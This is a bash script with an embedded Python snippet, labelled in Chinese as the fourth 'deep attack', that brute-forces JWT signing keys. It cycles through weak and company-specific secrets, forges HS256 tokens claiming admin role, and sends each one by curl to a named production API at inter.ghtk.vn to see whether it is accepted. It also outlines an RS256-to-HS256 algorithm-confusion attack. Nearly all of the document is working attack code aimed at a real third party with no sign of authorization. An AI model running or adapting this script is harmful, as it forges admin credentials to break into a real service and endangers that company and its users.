#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 深度攻击4：JWT密钥爆破"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 弱密钥字典
WEAK_KEYS=(
    "secret"
    "password"
    "123456"
    "admin"
    "ghtk"
    "giaohangtietkiem"
    "jwt_secret"
    "my_secret"
    "secret_key"
    "laravel"
    "spring"
    "test"
    "dev"
    "production"
)

echo "[*] 尝试弱JWT密钥..."

# 假设我们有一个JWT token（从响应头或其他地方获取）
# 这里我们尝试用弱密钥伪造一个

for key in "${WEAK_KEYS[@]}"; do
    echo "  测试密钥: $key"
    
    # 使用Python生成JWT（如果有的话）
    python3 << PYEOF 2>/dev/null
import hmac
import hashlib
import base64
import json

header = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "exp": 9999999999}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

message = f"{header_b64}.{payload_b64}"
signature = base64.urlsafe_b64encode(
    hmac.new("$key".encode(), message.encode(), hashlib.sha256).digest()
).decode().rstrip('=')

token = f"{message}.{signature}"
print(f"Token: {token[:50]}...")

# 测试token
import subprocess
result = subprocess.run([
    "curl", "-sk", "https://inter.ghtk.vn/api/v1/user",
    "-H", f"Authorization: Bearer {token}",
    "-m", "3"
], capture_output=True, text=True)

if "unauthorized" not in result.stdout.lower() and "401" not in result.stdout:
    print(f"⚠️  密钥可能有效: $key")
PYEOF
done

echo ""
echo "[*] 测试JWT算法混淆攻击..."
# RS256 -> HS256 攻击
# 如果服务器公钥可以获取，尝试用公钥作为HMAC密钥

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
